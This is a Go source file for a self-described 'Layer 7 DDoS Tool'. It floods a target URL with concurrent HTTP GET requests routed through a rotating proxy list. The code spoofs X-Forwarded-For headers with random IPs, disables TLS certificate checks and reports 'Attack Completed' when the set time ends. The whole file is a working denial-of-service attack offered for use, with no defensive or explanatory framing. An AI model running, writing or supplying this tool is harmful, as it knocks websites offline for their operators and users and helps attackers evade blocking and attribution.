package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	banner = `    _____  __         _      
   / ___/ / /_ _____ (_)_  __
   \__ \ / __// ___// /| |/_/
  ___/ // /_ / /   / /_>  <  
 /____/ \__//_/   /_//_/|_|  
                            v3.0`

	usage = `Usage: go run main.go <target> <time> <rate> <threads> <proxy-file>`
)

type Config struct {
	Target    string
	Time      int
	Rate      int
	Threads   int
	ProxyFile string
}

var logger = log.New(os.Stdout, "[INFO] ", log.LstdFlags|log.Lshortfile)

func main() {
	if len(os.Args) < 6 {
		fmt.Println(usage)
		os.Exit(1)
	}

	config := &Config{
		Target:    os.Args[1],
		Time:      parseInt(os.Args[2]),
		Rate:      parseInt(os.Args[3]),
		Threads:   parseInt(os.Args[4]),
		ProxyFile: os.Args[5],
	}

	printBanner(config)
	proxies := loadProxies(config.ProxyFile)

	if len(proxies) == 0 {
		logger.Fatal("No proxies loaded. Exiting.")
	}

	var wg sync.WaitGroup
	for i := 1; i <= config.Threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			workerThread(threadID, config, proxies)
		}(i)
	}

	time.Sleep(time.Duration(config.Time) * time.Second)
	logger.Println("Attack Completed.")
}

func parseInt(s string) int {
	val, err := strconv.Atoi(s)
	if err != nil {
		logger.Fatalf("Error parsing integer: %v", err)
	}
	return val
}

func loadProxies(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		logger.Fatalf("Error opening proxy file: %v", err)
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" && validateProxyFormat(proxy) {
			proxies = append(proxies, proxy)
		}
	}
	if err := scanner.Err(); err != nil {
		logger.Fatalf("Error reading proxies: %v", err)
	}
	return proxies
}

func validateProxyFormat(proxy string) bool {
	_, err := url.Parse("http://" + proxy)
	return err == nil
}

func printBanner(config *Config) {
	fmt.Println(banner)
	fmt.Println("-------------------------------------------")
	fmt.Printf("-> Target \t: %s\n", config.Target)
	fmt.Printf("-> Time \t: %d seconds\n", config.Time)
	fmt.Printf("-> Rate \t: %d\n", config.Rate)
	fmt.Printf("-> Threads\t: %d\n", config.Threads)
	fmt.Printf("-> ProxyFile\t: %s\n", config.ProxyFile)
	fmt.Println("-------------------------------------------")
	fmt.Println("-> Layer 7 DDoS Tool Initialized")
	fmt.Println("-------------------------------------------")
	fmt.Println()
}

func workerThread(id int, config *Config, proxies []string) {
	logger.Printf("Worker Thread %d Started\n", id)
	client := createHTTPClient(proxies)
	targetURL, err := url.Parse(config.Target)
	if err != nil {
		logger.Printf("Error parsing target URL: %v", err)
		return
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for range ticker.C {
		var wg sync.WaitGroup
		for i := 0; i < config.Rate; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				req := buildRequest(targetURL)
				resp, err := client.Do(req)
				if err != nil {
					logger.Printf("Request error: %v", err)
					return
				}
				resp.Body.Close()
			}()
		}
		wg.Wait()
	}
}

func createHTTPClient(proxies []string) *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy: func(_ *http.Request) (*url.URL, error) {
				proxy := proxies[rand.Intn(len(proxies))]
				return url.Parse("http://" + proxy)
			},
		},
		Timeout: 10 * time.Second,
	}
}

func buildRequest(targetURL *url.URL) *http.Request {
	req, _ := http.NewRequest("GET", targetURL.String(), nil)
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", getRandomAccept())
	req.Header.Set("Accept-Language", getRandomLanguage())
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("X-Forwarded-For", generateIP())
	req.Header.Set("Origin", targetURL.Scheme+"://"+targetURL.Host)
	return req
}

// Simulasi header random untuk meningkatkan efektivitas
func getRandomUserAgent() string   { return "Mozilla/5.0 (compatible; CustomBot/1.0)" }
func getRandomAccept() string      { return "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }
func getRandomLanguage() string    { return "en-US,en;q=0.5" }
func generateIP() string           { return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)) }

func getCurrentTime() string {
	return time.Now().Format("15:04:05")
}
